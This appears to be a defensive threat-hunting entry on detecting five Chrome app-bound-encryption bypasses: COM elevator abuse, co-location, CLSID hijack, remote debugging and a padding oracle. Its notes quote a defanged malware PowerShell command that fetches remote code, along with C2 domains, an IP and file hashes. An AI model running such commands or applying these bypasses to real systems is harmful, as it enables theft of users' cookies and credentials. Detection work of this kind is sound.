id: H331
category: Flames
title: Defeating the Chrome elevation service's path check without injecting - COM, co-location, CLSID hijack, remote debugging and the padding oracle
hypothesis: >-
  Since Chrome 127, the cookie and credential blobs on disk are useless without the app-bound
  encryption master key, which lives behind a SYSTEM-privileged Windows service. That service wraps
  the key with SYSTEM-DPAPI and then User-DPAPI, hands it back only over COM, and before it does so
  it compares the CALLER'S IMAGE PATH against the path recorded when the key was sealed. Every
  bypass therefore has to answer one question - how does a process that is not Chrome satisfy a path
  comparison against Chrome? HEARTH already covers the answer that reaches into browser MEMORY in
  [[H249]]. This hunt deliberately covers the other five, which never touch process memory and are
  invisible to memory-oriented detection: instantiating the `IElevator` COM interface directly;
  writing a binary INTO the browser's own `Application` directory so co-location satisfies the check;
  hijacking a CLSID the browser loads via an `HKCU\Software\Classes\CLSID\...\InprocServer32`
  override; driving the browser through `--remote-debugging-port` to read cookies over the DevTools
  protocol; and the C4 padding oracle, which strips the SYSTEM-DPAPI layer byte by byte using the
  elevation service's own error responses. Each leaves a registry, file-create, image-load or
  event-log artefact and none leaves a Sysmon Event ID 8 or 10.

  - 'Sysmon Event ID 12 and 13 (registry key and value create/set) under `HKCU\Software\Classes\CLSID\` and `HKLM\SOFTWARE\Classes\CLSID\`, specifically the `InprocServer32` and `LocalServer32` default values - this is where COM hijacking lands and it is the axis most often not collected'

false_positive_notes: |
  These five axes have very different base rates and should not share a threshold. `--headless` and `--remote-debugging-port` have substantial legitimate use - CI runners, Selenium and Playwright estates, PDF-generation and screenshot services, scraping tooling, synthetic-monitoring agents and accessibility products all use them, and on a developer or QA workstation they are entirely ordinary. The discriminator is never the flag; it is the PARENT PROCESS and the user context, plus whether `--user-data-dir` points at the user's REAL profile rather than at a scratch directory. Automation almost always drives a throwaway profile, because sharing the live one breaks the running browser; a stealer wants the live one specifically, and that single argument carries most of the fidelity on this axis.
  Writes into the browser `Application` directory are dominated by the browsers' own updaters - `GoogleUpdate.exe`, `updater.exe`, `MicrosoftEdgeUpdate.exe`, `elevation_service.exe` - and by enterprise deployment tooling. All of those are signed, and all of them write a complete versioned subdirectory (`...\Application\<version>\`) rather than a single loose file. A lone unsigned executable or DLL sitting directly in `...\Application\` beside `chrome.exe` has close to no benign explanation, which makes this the cleanest axis in the hunt and the one to instrument first if only one can be.
  COM registration under `HKCU` is legitimately used by per-user application installs, by some Office add-ins and by a number of developer tools, so the registry axis needs the same provenance test rather than an alert on the key itself: the finding is an `InprocServer32` pointing at an unsigned binary, or at a path under `%TEMP%`, `%APPDATA%`, `%LOCALAPPDATA%` or a Downloads folder. Legitimate COM registration overwhelmingly lives in `HKLM` and points at signed binaries in system directories, and the HKCU-over-HKLM precedence is precisely what the hijack exploits. Elevation-service decryption failures also occur innocently after profile corruption, OS reimaging, a DPAPI credential change or a user password reset, so the oracle signal is a BURST from one host over minutes, never any individual failure.
  Two cautions. First, this hunt is deliberately scoped AWAY from the injection and memory-scraping route, which [[H249]] covers - a batch of hits there should be triaged under that hunt, and an estate that runs only this one has a gap the size of the most common bypass family. Run them together. Second, and more importantly, Elastic's analysis of a Stealc infection found that NO endpoint telemetry indicated an app-bound-encryption bypass at all; the stealer was caught by unrelated analytics and the technique was only recovered during malware analysis afterwards. Treat an empty result as inconclusive rather than as clean. The most reliable confirmation that this theft occurred is not on the endpoint - it is a valid session for that user replaying from a device the tenant does not manage, shortly afterwards.
notes: |
  What app-bound encryption does, because the hunt is a direct consequence of its design - Chrome 127 (July 2024) bound the cookie and credential encryption key to the application. The key is wrapped by a SYSTEM-privileged Windows service using SYSTEM-DPAPI and then User-DPAPI via token impersonation; when `chrome.exe` wants it, it asks that service over COM, and the service compares the requesting image path against the path recorded when the key was sealed. Chromium derivatives inherit the mechanism, so Microsoft Edge and Brave are in scope on identical terms. The consequence for a stealer is that lifting `Local State`, `Cookies` and `Login Data` off the box no longer works - the key must be obtained on the host, live, which converts a silent file copy into an interaction with a privileged service. That conversion is the whole detection opportunity, and this hunt enumerates the ways it is currently performed without touching browser memory.
  Axis 1, direct COM abuse of the elevation service - instantiate the Chrome `IElevator` interface and ask the service to decrypt. LummaC2 did exactly this. The published consensus is that it is noisy and easily detected, which is why operators moved on, but it has not disappeared and it is cheap to look for. Hunt Sysmon Event ID 7 for the elevation-service proxy or `elevation_service.exe` being loaded or launched with an unexpected caller, and Event ID 1 for `elevation_service.exe` with a parent that is not the browser or its updater.
  Axis 2, path spoofing by co-location - drop the collector into the browser's own `Application` directory so the service's path comparison succeeds on its own terms. Watch `%PROGRAMFILES%\Google\Chrome\Application\`, `%PROGRAMFILES(X86)%\Microsoft\Edge\Application\`, `%LOCALAPPDATA%\Google\Chrome\Application\` and the Brave equivalent for any executable file create that is not part of a signed, versioned updater drop. The published research notes this axis specifically offers behavioural detection opportunity because it REQUIRES suspicious modification of the browser application folder - there is no way to do it quietly.
  Axis 3, COM hijacking - register a malicious DLL under a CLSID the browser loads (the documented example hijacks a CLSID normally backed by `propsys.dll`), which gets attacker code running inside the Chrome process by ordinary module load rather than by injection, at which point the elevation service answers happily. The detection pair is Sysmon Event ID 12/13 on `HKCU\Software\Classes\CLSID\{...}\InprocServer32` plus Event ID 7 for an unsigned DLL loaded by `chrome.exe`. Note this is also why the hunt carries `T1546.015` - the COM-hijack half is a persistence primitive in its own right and will frequently outlive the theft.
  Axis 4, remote debugging - launch or attach to the browser with `--remote-debugging-port=<n>`, commonly with `--headless=new`, `--disable-gpu` and a `--user-data-dir=` pointed at the REAL profile, then drive the DevTools protocol and call `Network.getAllCookies`. Hunt the command line for the flag combination, filter on parent process, and additionally watch Sysmon Event ID 3 for loopback connections to the debugging port from a process that is not a recognised automation tool. ChromeKatz-derived tooling and several commodity stealers use this route because it needs no elevation and no memory access at all.
  Axis 5, the C4 cryptographic oracle - CyberArk fed tampered encrypted blobs to the elevation service and used the DIFFERENCE between a padding failure and a signature mismatch, observable in Windows Event Viewer, as an oracle to peel off the SYSTEM-DPAPI layer byte by byte. The artefact is volumetric rather than singular: a large burst of elevation-service decryption errors on one host in a short window. The research explicitly notes the approach generalises to any SYSTEM-DPAPI-protected blob, so the burst pattern is worth watching beyond browsers - it is the only axis here that is not Chrome-specific in principle.
  Verbatim LegionLoader artefacts from the AhnLab report, for retrospective search only - ClickFix PowerShell `PowerShell -w h -ep bypass -c "$s=irm ''leappoploaderinstantly[.]Monster/yAzkCl1tDKSGNGGxw'' -UseBasicParsing;..."` (the invocation primitive itself is [[H332]]), injection targets `explorer.exe` (shellcode) and `RuntimeBroker.exe` (hollowing), C2 `dallasbackstage[.]com/nfront.php` and `/nback.php`, `gemscocl[.]com/nfront.php` and `/nback.php`, C2 IP `89[.]34.90.217`, lure domains `ascendpopdownloadtoday[.]monster`, `gushpopsecretdownload[.]monster`, `leappoploaderinstantly[.]monster`, `jetpopdownloadsecret[.]monster`, `pixelrainbowclub[.]cfd`, `dreamysamuraisoul[.]cfd`, `animecelestialblaze[.]cfd`, `socialseoguru[.]com`, payload MD5s `0128a4b78aab83796042118ecb3e46e0`, `27745ec8bde201e771e3f4069e887cad`, `685b6822b0c66f4f18496eb6ce24f984`, `8467ca57bdf6e6e94ca4e1484628b1aa`, `c4debc1b25ab67f094676ddc3195fa41`. [[H261]] covers passkey theft from the Chrome sync LevelDB and [[H305]] covers Secure Preferences MAC forgery for extension sideloading; both are T1555.003 against Chrome but neither touches the elevation service. # H331

Google's app-bound encryption, shipped in Chrome 127 in July 2024, was a real structural improvement. It moved the cookie and credential key behind a SYSTEM-privileged service that will only return it to a caller whose image path matches the one recorded when the key was sealed. Copying `Cookies` and `Login Data` off a victim machine stopped being enough. Within months every serious infostealer had a bypass, and AhnLab's LegionLoader write-up shows the capability embedded in a loader whose day job is delivering other people's payloads.

HEARTH already hunts the bypass that reaches into browser memory. This hunt is about the other five, and the distinction matters operationally: none of them produce a process-access or remote-thread event, so an estate whose browser-credential detection is built on memory access has complete coverage of one family and none of the rest. What these five share is not a technique but a question — how does a process that is not Chrome pass a path check against Chrome? — and the answers show up in the registry, in file creates inside the browser's own program directory, in image loads, in command-line flags, and in a log almost nobody forwards.

## Why

- **The control converted a silent file read into a privileged interaction, and that is the gift.** Before app-bound encryption, browser credential theft was a file copy — quiet, fast, and nearly indistinguishable from a backup agent. Now the key has to be obtained live from a service that has to be persuaded. The bar moved in the defender's favour; the work is collecting the axes rather than inventing new telemetry.
- **Scoping around the path check is what keeps the hunt from going stale.** COM, registry, command-line flags and an oracle attack look like four unrelated problems. They are four answers to one question, and organising the hunt that way means the next published bypass — which will also have to answer it — lands somewhere the hunt is already looking.
- **A write into the browser's own `Application` directory is close to a free detection.** Only the updater writes there, it writes signed versioned subdirectories, and it does so on a predictable cadence. A single loose unsigned binary sitting beside `chrome.exe` has essentially no innocent explanation and needs almost no tuning, which makes it the axis to instrument first when time is short.
- **Cookies outrank passwords now, which changes what a hit here means.** A stolen session token bypasses the password and the MFA prompt in one step. That is why stealers invested engineering effort in defeating this control rather than settling for saved passwords, and it is why a confirmed hit is the opening of an identity-compromise investigation rather than a password reset.
- **The empty-result case has to be read carefully, and saying so is part of the hunt.** Elastic documented a Stealc infection in which no endpoint telemetry showed the bypass at all. This hunt establishes presence, not absence. Its natural partner is the identity side — a valid session replaying from an unmanaged device — and pairing them is what makes a negative result mean something.
